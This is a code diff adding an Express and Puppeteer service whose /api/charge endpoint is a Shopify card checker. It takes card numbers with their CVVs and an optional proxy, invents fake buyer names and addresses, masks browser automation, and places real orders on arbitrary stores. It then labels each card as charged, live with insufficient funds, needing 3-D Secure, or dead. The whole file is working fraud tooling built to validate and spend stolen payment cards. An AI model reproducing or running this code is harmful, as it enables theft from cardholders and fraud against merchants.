@@ -1,0 +1,330 @@
+const express = require('express');
+const puppeteer = require('puppeteer');
+const app = express();
+
+app.use(express.json());
+
+let requestCount = 0;
+
+// --- REALISTIC US ADDRESS & PROFILE GENERATOR ---
+function generateRandomProfile() {
+    const firstNames = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles", "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen"];
+    const lastNames = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Miller", "Davis", "Garcia", "Rodriguez", "Wilson", "Martinez", "Anderson", "Taylor", "Thomas", "Hernandez", "Moore", "Martin", "Jackson", "Thompson", "White"];
+    
+    const streets = [
+        { name: "1428 Elm Street", city: "Los Angeles", state: "CA", zip: "90001", code: "US" },
+        { name: "742 Evergreen Terrace", city: "Springfield", state: "OR", zip: "97477", code: "US" },
+        { name: "221b Baker Road", city: "New York", state: "NY", zip: "10001", code: "US" },
+        { name: "404 Not Found Lane", city: "Austin", state: "TX", zip: "78701", code: "US" },
+        { name: "1060 West Addison Street", city: "Chicago", state: "IL", zip: "60613", code: "US" },
+        { name: "350 5th Ave", city: "New York", state: "NY", zip: "10118", code: "US" },
+        { name: "600 E Washington St", city: "Phoenix", state: "AZ", zip: "85004", code: "US" },
+        { name: "1600 Amphitheatre Pkwy", city: "Mountain View", state: "CA", zip: "94043", code: "US" }
+    ];
+
+    const fName = firstNames[Math.floor(Math.random() * firstNames.length)];
+    const lName = lastNames[Math.floor(Math.random() * lastNames.length)];
+    const location = streets[Math.floor(Math.random() * streets.length)];
+    const randomNum = Math.floor(10000 + Math.random() * 90000);
+    const email = `${fName.toLowerCase()}.${lName.toLowerCase()}${randomNum}@gmail.com`;
+
+    return {
+        first_name: fName,
+        last_name: lName,
+        email: email,
+        address1: location.name,
+        city: location.city,
+        province_code: location.state,
+        country_code: location.code,
+        zip: location.zip
+    };
+}
+
+const USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
+];
+
+app.get('/', (req, res) => {
+    res.send({ status: "Shopify Headless Browser Engine Active", uptime: process.uptime() });
+});
+
+app.get('/health', (req, res) => {
+    res.json({ status: "OK", uptime: process.uptime(), memory: process.memoryUsage() });
+});
+
+app.get('/metrics', (req, res) => {
+    res.json({
+        requests_handled: requestCount,
+        uptime_seconds: process.uptime(),
+        memory_usage_mb: Math.round(process.memoryUsage().rss / 1024 / 1024)
+    });
+});
+
+app.post('/api/charge', async (req, res) => {
+    requestCount++;
+    const { card, site, proxy } = req.body;
+
+    if (!card || !site) {
+        return res.json({ status: "Dead", message: "MISSING_DATA", gateway: "Shopify Payments", price: "-", site: site || "N/A" });
+    }
+
+    let cleanSite = site.trim().replace(/\/$/, '');
+    if (!cleanSite.startsWith('http')) {
+        cleanSite = 'https://' + cleanSite;
+    }
+
+    const [ccNo, expMonth, expYear, cvv] = card.split('|');
+
+    if (!ccNo || ccNo.length < 15 || ccNo.length > 16 || !expMonth || !expYear || !cvv) {
+        return res.json({ status: "Dead", message: "INVALID_CARD_FORMAT", gateway: "Shopify Payments", price: "-", site: cleanSite });
+    }
+
+    const profile = generateRandomProfile();
+    console.log(`⚡ [Railway API] Target: ${cleanSite} | Buyer: ${profile.email} | Proxy: ${proxy ? proxy.split(':')[0] : 'None'}`);
+
+    let browser = null;
+    let page = null;
+    try {
+        let proxyServer = null;
+        let proxyAuth = null;
+
+        if (proxy && typeof proxy === 'string' && proxy.trim().length > 0) {
+            let pClean = proxy.trim();
+            const parts = pClean.split(':');
+            if (parts.length >= 4) {
+                // Format: ip:port:user:pass
+                proxyServer = `${parts[0]}:${parts[1]}`;
+                proxyAuth = { username: parts[2], password: parts.slice(3).join(':') };
+            } else if (parts.length === 2) {
+                // Format: ip:port
+                proxyServer = `${parts[0]}:${parts[1]}`;
+            }
+        }
+
+        // Build launch arguments including proxy server if provided
+        const launchArgs = [
+            '--no-sandbox',
+            '--disable-setuid-sandbox',
+            '--disable-dev-shm-usage',
+            '--no-first-run',
+            '--no-zygote',
+            '--disable-blink-features=AutomationControlled',
+            '--disable-features=IsolateOrigins,site-per-process'
+        ];
+
+        if (proxyServer) {
+            launchArgs.push(`--proxy-server=${proxyServer}`);
+        }
+
+        browser = await puppeteer.launch({
+            headless: 'new',
+            args: launchArgs
+        });
+
+        page = await browser.newPage();
+
+        // Handle proxy authentication if username and password exist
+        if (proxyAuth) {
+            await page.authenticate(proxyAuth);
+        }
+
+        const randomUA = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
+        await page.setUserAgent(randomUA);
+        
+        await page.setRequestInterception(true);
+        page.on('request', (req) => {
+            const resourceType = req.resourceType();
+            if (['image', 'stylesheet', 'font', 'media'].includes(resourceType)) {
+                req.abort();
+            } else {
+                req.continue();
+            }
+        });
+
+        let capturedResponseText = "";
+        page.on('response', async (response) => {
+            const url = response.url();
+            if (url.includes('/checkout') || url.includes('/pay') || url.includes('payment') || url.includes('sessions')) {
+                try {
+                    const text = await response.text();
+                    if (text && (text.includes('insufficient') || text.includes('declined') || text.includes('error') || text.includes('three_d_secure') || text.includes('thank_you'))) {
+                        capturedResponseText = text;
+                    }
+                } catch (e) {}
+            }
+        });
+
+        const prodRes = await page.goto(`${cleanSite}/products.json?limit=15`, { waitUntil: 'domcontentloaded', timeout: 20000 }).catch(() => null);
+        if (!prodRes) {
+            await browser.close();
+            return res.json({ status: "Dead", message: "PROXY_CONNECTION_TIMEOUT", gateway: "Shopify Payments", price: "-", site: cleanSite });
+        }
+
+        const responseText = await page.evaluate(() => document.body.innerText).catch(() => "");
+        let prodData = {};
+        try {
+            prodData = JSON.parse(responseText);
+        } catch (e) {
+            await browser.close();
+            return res.json({ status: "Dead", message: "STORE_BLOCKED_OR_JSON_PROTECTED", gateway: "Shopify Payments", price: "-", site: cleanSite });
+        }
+
+        let selectedVariantId = null;
+        let lowestPrice = Infinity;
+
+        if (prodData && prodData.products && prodData.products.length > 0) {
+            for (const prod of prodData.products) {
+                for (const v of prod.variants) {
+                    const p = parseFloat(v.price);
+                    if (p > 0 && v.available && p < lowestPrice) {
+                        lowestPrice = p;
+                        selectedVariantId = v.id;
+                    }
+                }
+            }
+        }
+
+        let selectedPrice = selectedVariantId ? lowestPrice : 5.00;
+
+        if (!selectedVariantId) {
+            await browser.close();
+            return res.json({ status: "Dead", message: "NO_AVAILABLE_PRODUCTS", gateway: "Shopify Payments", price: "-", site: cleanSite });
+        }
+
+        const formattedPrice = `$${selectedPrice.toFixed(2)}`;
+
+        const addCartSuccess = await page.evaluate(async (variantId) => {
+            try {
+                const res = await fetch('/cart/add.js', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: variantId, quantity: 1 })
+                });
+                return res.ok;
+            } catch (err) {
+                return false;
+            }
+        }, selectedVariantId);
+
+        if (!addCartSuccess) {
+            await browser.close();
+            return res.json({ status: "Dead", message: "CART_ADD_FAILED", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
+        }
+
+        const vaultResult = await page.evaluate(async (ccNo, expMonth, expYear, cvv, fullName) => {
+            try {
+                const response = await fetch('https://elb.deposit.shopifycs.com/sessions', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                    body: JSON.stringify({
+                        credit_card: { number: ccNo, month: expMonth, year: expYear, name: fullName, verification_value: cvv }
+                    })
+                });
+                if (!response.ok) return { error: "HTTP_ERROR_" + response.status };
+                const text = await response.text();
+                try {
+                    return JSON.parse(text);
+                } catch (err) {
+                    return { error: "INVALID_JSON_RESPONSE" };
+                }
+            } catch (e) {
+                return { error: e.message };
+            }
+        }, ccNo, expMonth, expYear, cvv, `${profile.first_name} ${profile.last_name}`);
+
+        if (!vaultResult || !vaultResult.id) {
+            await browser.close();
+            return res.json({ status: "Dead", message: vaultResult?.error || "CARD_VAULT_FAILED", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
+        }
+
+        await page.goto(`${cleanSite}/checkout`, { waitUntil: 'domcontentloaded', timeout: 25000 }).catch(() => null);
+
+        await page.evaluate(async (prof) => {
+            await fetch(window.location.href, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
+                body: JSON.stringify({
+                    step: 'contact_information',
+                    checkout: {
+                        email: prof.email,
+                        shipping_address: {
+                            address1: prof.address1,
+                            city: prof.city,
+                            country_code: prof.country_code,
+                            province_code: prof.province_code,
+                            zip: prof.zip,
+                            first_name: prof.first_name,
+                            last_name: prof.last_name
+                        }
+                    }
+                })
+            });
+        }, profile).catch(() => {});
+
+        await page.evaluate(async (vaultId) => {
+            try {
+                let btn = document.querySelector('button[type="submit"], #continue_button, .step__footer__continue-btn, button.checkout-payment-btn, button[name="button"]');
+                if (!btn) {
+                    const allButtons = Array.from(document.querySelectorAll('button, input[type="submit"], [role="button"]'));
+                    btn = allButtons.find(b => {
+                        const text = (b.innerText || b.value || '').toLowerCase();
+                        return text.includes('pay') || text.includes('complete') || text.includes('place order') || text.includes('continue');
+                    });
+                }
+                if (btn) { btn.click(); return true; }
+                return false;
+            } catch (e) {
+                return false;
+            }
+        }, vaultResult.id);
+
+        for (let i = 0; i < 16; i++) {
+            if (capturedResponseText) break;
+            await new Promise(r => setTimeout(r, 500));
+        }
+
+        const finalUrl = page.url();
+        const pageText = await page.evaluate(() => document.body.innerText).catch(() => "");
+        const combinedText = (pageText + " " + capturedResponseText).toLowerCase();
+
+        await browser.close();
+        browser = null;
+
+        const isRealSuccess = 
+            (finalUrl.includes('thank_you') || combinedText.includes('thank_you')) && 
+            (combinedText.includes('order_number') || combinedText.includes('checkout_token')) &&
+            !combinedText.includes('error') &&
+            !combinedText.includes('declined') &&
+            !combinedText.includes('insufficient');
+
+        if (isRealSuccess) {
+            return res.json({ status: "CHARGED", message: "ORDER_PLACED_SUCCESSFULLY", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
+        } else if (combinedText.includes('insufficient_funds') || combinedText.includes('insufficient funds')) {
+            return res.json({ status: "CVV Live/Insufficient", message: "INSUFFICIENT_FUNDS", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
+        } else if (combinedText.includes('three_d_secure') || combinedText.includes('challenge') || combinedText.includes('3d secure') || combinedText.includes('three_d_secure_action')) {
+            return res.json({ status: "3D/OTP", message: "CHALLENGE_REQUIRED_3DS", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
+        } else if (combinedText.includes('incorrect_cvc') || combinedText.includes('security code')) {
+            return res.json({ status: "CVV Live/Insufficient", message: "CCN_LIVE_INCORRECT_CVC", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
+        } else {
+            let reason = "DECLINED_BY_PROCESSOR";
+            if (combinedText.includes('stolen')) reason = "STOLEN_CARD";
+            else if (combinedText.includes('expired')) reason = "EXPIRED_CARD";
+            else if (combinedText.includes('fraud')) reason = "FRAUDULENT";
+            
+            return res.json({ status: "Dead", message: reason, gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
+        }
+
+    } catch (err) {
+        if (browser) {
+            try { await browser.close(); } catch(e) {}
+        }
+        console.log(`🔥 [CRITICAL EXCEPTION]: ${err.message}`);
+        return res.json({ status: "Dead", message: `ERR_${err.message.substring(0, 30).toUpperCase()}`, gateway: "Shopify Payments", price: "-", site: site || "N/A" });
+    }
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Optimized Headless Browser Engine running on port ${PORT}`));
